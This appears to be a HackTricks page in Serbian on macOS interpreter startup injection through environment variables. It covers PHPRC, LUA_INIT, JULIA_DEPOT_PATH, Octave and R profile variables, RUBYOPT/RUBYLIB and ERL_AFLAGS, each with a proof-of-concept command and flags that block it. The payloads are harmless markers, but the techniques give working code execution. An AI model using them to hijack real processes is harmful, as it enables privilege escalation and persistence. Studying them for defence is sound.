# Инјекција при покретању macOS интерпретатора преко променљивих окружења

{{#include ../../../banners/hacktricks-training.md}}

Ове технике специфичне за појединачне runtime-е користе наслеђене променљиве окружења за избор конфигурације при покретању, учитавање кода или прослеђивање VM заставица пре покретања предвиђеног радног оптерећења. Неке варијанте користе датотеке; Lua и Erlang подржавају и извршавање кода у линији.

## Конфигурација PHP-а при покретању

### `PHPRC` / `PHP_INI_SCAN_DIR` и `auto_prepend_file`

PHP CLI и CGI учитавају конфигурацију при сваком покретању. `PHPRC` може да изабере датотеку `php.ini` читљиву нападачу, док `PHP_INI_SCAN_DIR` може да преусмери директоријум у ком се траже додатне `.ini` датотеке. Директива `auto_prepend_file` налаже PHP-у да обради датотеку пре тражене скрипте, чиме ова комбинација омогућава извршавање кода при покретању.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

Alternativa je direktorijum koji sadrži `.ini` datoteku:

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

Opcija `-n` ignoriše `php.ini`; eksplicitna pouzdana putanja `-c` ima prednost u odnosu na `PHPRC`. Imajte na umu da dugotrajni serverski SAPI obično učitava konfiguraciju pri pokretanju web servera, dok je CLI i CGI učitavaju pri svakom pozivu.<sup>[[1]](#references)</sup>

## Lua početni kôd

### `LUA_INIT`

Pre obrade opcija komandne linije ili ciljne skripte, samostalni Lua interpreter izvršava `LUA_INIT_<major>_<minor>` ili, ako promenljiva sa oznakom verzije nije definisana, `LUA_INIT`. Vrednost koja počinje sa `@` označava datoteku; svaka druga vrednost se direktno izvršava kao Lua kôd. To omogućava izvršavanje pri pokretanju i iz datoteke i bez nje.<sup>[[3]](#references)</sup>

```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```

Tačan naziv sa verzijom razlikuje se u zavisnosti od interpretera, na primer `LUA_INIT_5_4`. `lua -E` ignoriše sve promenljive okruženja, uključujući početni kod i putanje Lua modula.

## Julia startup depot

### `JULIA_DEPOT_PATH` i `startup.jl`

Julia obično pri pokretanju izvršava `config/startup.jl` iz svog prvog depot-a. `JULIA_DEPOT_PATH` kontroliše listu depot-a, pa njegovo usmeravanje na stablo kojem napadač može da pristupi preusmerava automatski učitavanu početnu datoteku.<sup>[[4]](#references)[[5]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

Završni separator je koristan kada su žrtvi i dalje potrebni njeni uobičajeni paketi. `julia --startup-file=no` onemogućava ovu startup datoteku. Obrišite promenljivu pre pokretanja jer ona takođe kontroliše registre paketa, okruženja, keševe i lokacije za učitavanje koda.

## GNU Octave startup datoteke

### `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave tokom pokretanja izvršava nekoliko datoteka koje sadrže važeće Octave komande. `OCTAVE_SITE_INITFILE` zamenjuje startup datoteku za ceo sajt, a `OCTAVE_VERSION_INITFILE` zamenjuje onu specifičnu za verziju, pa svaka od ovih promenljivih može da preusmeri automatsko izvršavanje na datoteku koju napadač može da čita.<sup>[[6]](#references)</sup>

```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```

`--no-init-file` preskače samo korisničke datoteke kao što je `~/.octaverc`; **ne** sprečava prethodno navedeno zaobilaženje pomoću site datoteke. Koristite `--no-site-file` za site datoteke ili `--norc` / `-f` da biste onemogućili sve datoteke za pokretanje.<sup>[[7]](#references)</sup>

## R profili za pokretanje i učitavanje paketa

### `R_PROFILE_USER` / `R_PROFILE`

Pri pokretanju, R učitava site i korisničke profilne datoteke koje sadrže R kod. `R_PROFILE` bira site profil, a `R_PROFILE_USER` bira korisnički profil, što omogućava nasleđenom okruženju da preusmeri bilo koju od tih pretraga na datoteku koju napadač može da čita.<sup>[[8]](#references)</sup>

```bash
echo 'file.create("/tmp/r-profile-executed")' >/tmp/attacker.Rprofile
R_PROFILE_USER=/tmp/attacker.Rprofile Rscript victim.R
```

`--no-init-file` preskače korisnički profil, `--no-site-file` preskače profil sajta, a `--vanilla` uključuje obe zaštite. R najpre obrađuje datoteke okruženja izabrane pomoću `R_ENVIRON` i `R_ENVIRON_USER`, ali te datoteke samo postavljaju promenljive; promenljive profila su direktni mehanizam za izvršavanje proizvoljnog koda.

### `R_DEFAULT_PACKAGES` / `R_SCRIPT_DEFAULT_PACKAGES` i putanje biblioteka

R tokom pokretanja učitava pakete razdvojene zarezima iz promenljive `R_DEFAULT_PACKAGES`. `Rscript` daje prednost promenljivoj `R_SCRIPT_DEFAULT_PACKAGES`. Kombinovanje bilo koje od ovih promenljivih sa `R_LIBS`, `R_LIBS_USER` ili `R_LIBS_SITE` može navesti R da pronađe i učita paket instaliran pod kontrolom napadača; njegova `.onLoad` ili `.onAttach` kuka se automatski izvršava.<sup>[[8]](#references)[[9]](#references)</sup>

```bash
# Assume an installed package named htpayload exists below /tmp/r-library.
R_LIBS_USER=/tmp/r-library \
R_DEFAULT_PACKAGES=htpayload \
R --no-save --no-restore --silent

R_LIBS_USER=/tmp/r-library \
R_SCRIPT_DEFAULT_PACKAGES=htpayload \
Rscript victim.R
```

Za ovo je potreban strukturno ispravan instalirani R paket, a ne samo izdvojena `.R` datoteka. `--vanilla` ne briše direktno nasleđene promenljive, pa pouzdani omotač mora da ukloni ili zameni promenljive za podrazumevane pakete i putanje biblioteka, kao i da onemogući datoteke profila.

## Opcije Ruby učitavača

### RUBYOPT

Ruby obrađuje podržane opcije komandne linije iz promenljive okruženja `RUBYOPT` pre pokretanja skripte. Ruby ne dozvoljava izvršavanje koda pomoću `-e` u promenljivoj `RUBYOPT`, ali `-I` može da doda direktorijum na početak putanje za pretragu biblioteka, a `-r` može da zahteva biblioteku. Zbog toga proces koji pokreće Ruby sa promenljivama okruženja koje kontroliše napadač može biti nateran da učita Ruby kod koji kontroliše napadač.<sup>[[10]](#references)</sup>

Napravite `/tmp/inject.rb`:

```ruby:inject.rb
puts `whoami`
```

Napravite bezopasnu Ruby skriptu, na primer `hello.rb`:

```ruby:hello.rb
puts 'Hello, World!'
```

Pokrenite ga sa kontrolisanom vrednošću `RUBYOPT`:

```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```

Da biste onemogućili ovo ponašanje, prosledite `--disable=rubyopt` (ili `--disable-rubyopt`) **pre** naziva skripte:<sup>[[10]](#references)</sup>

```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```

Opcija navedena nakon `hello.rb` prosleđuje se skripti u `ARGV`; ona ne onemogućava raniju Ruby obradu promenljive `RUBYOPT`.<sup>[[10]](#references)</sup>

```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```

### RUBYLIB

Umesto da se direktorijum za učitavanje doda na početak pomoću `-I` unutar `RUBYOPT`, zasebna promenljiva okruženja `RUBYLIB` dodaje direktorijume u Ruby-jev `$LOAD_PATH`. U kombinaciji sa `RUBYOPT=-r<module>`, učitava se napadačev kod bez potrebe za `-I` u `RUBYOPT`:<sup>[[10]](#references)</sup>

```bash
echo "puts \`whoami\`" > /tmp/inject.rb
RUBYLIB=/tmp RUBYOPT=-rinject ruby hello.rb
```

## Erlang i Elixir VM zastavice

### `ERL_AFLAGS`, `ERL_FLAGS` i `ERL_ZFLAGS`

Pokretač `erl` dodaje `ERL_AFLAGS` na početak komandne linije, a `ERL_FLAGS` / `ERL_ZFLAGS` na kraj. Pošto `-eval` evaluira Erlang izraz tokom inicijalizacije VM-a, ove promenljive mogu omogućiti izvršavanje koda bez datoteka pre predviđenog radnog opterećenja.<sup>[[11]](#references)</sup>

```bash
ERL_AFLAGS="-noshell -eval 'file:write_file(\"/tmp/erl-aflags-executed\", <<\"ok\">>).' -s init stop" erl
```

Elixir, Mix, Phoenix i mnoga Elixir izdanja na kraju pokreću Erlang VM i mogu naslediti ove zastavice. Proverite tačan wrapper izdanja: može ponovo da izgradi ili očisti argumente VM-a, dok neki alati izričito podržavaju `ERL_AFLAGS`, `ERL_ZFLAGS` ili `ELIXIR_ERL_OPTIONS`.<sup>[[12]](#references)</sup>

Za razliku od većine tehnika zasnovanih na datotekama, payload za `-eval` ne zahteva datoteku pod kontrolom napadača. Pouzdani wrapper treba da ukloni sve tri Erlang promenljive za zastavice (i `ELIXIR_ERL_OPTIONS` za Elixir) pre pokretanja runtime-a; nemojte pokušavati da dozvolite pojedinačne VM zastavice osim ako u potpunosti razumete parser i redosled.

## References

- [1] [Konfiguraciona datoteka PHP-a](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
- [3] [Samostalni interpreter Lua 5.4](https://www.lua.org/manual/5.4/manual.html#7)
- [4] [Julia interfejs komandne linije: datoteka za pokretanje](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [5] [Julia promenljive okruženja: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
- [6] [GNU Octave datoteke za pokretanje](https://docs.octave.org/latest/Startup-Files.html)
- [7] [Opcije komandne linije GNU Octave-a](https://docs.octave.org/latest/Command-Line-Options.html)
- [8] [Inicijalizacija pri pokretanju R sesije](https://stat.ethz.ch/R-manual/R-devel/library/base/html/Startup.html)
- [9] [Instalacija i administracija R-a: dodatni paketi](https://stat.ethz.ch/CRAN/doc/manuals/r-release/R-admin.html)
- [10] [Ruby dokumentacija - opcije komandne linije za Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
- [11] [`erl` komanda i promenljive okruženja](https://www.erlang.org/doc/apps/erts/erl_cmd.html)
- [12] [Elixir izdanja i opcije okruženja VM-a](https://hexdocs.pm/elixir/releases.html#operating-system-scripts)
{{#include ../../../banners/hacktricks-training.md}}
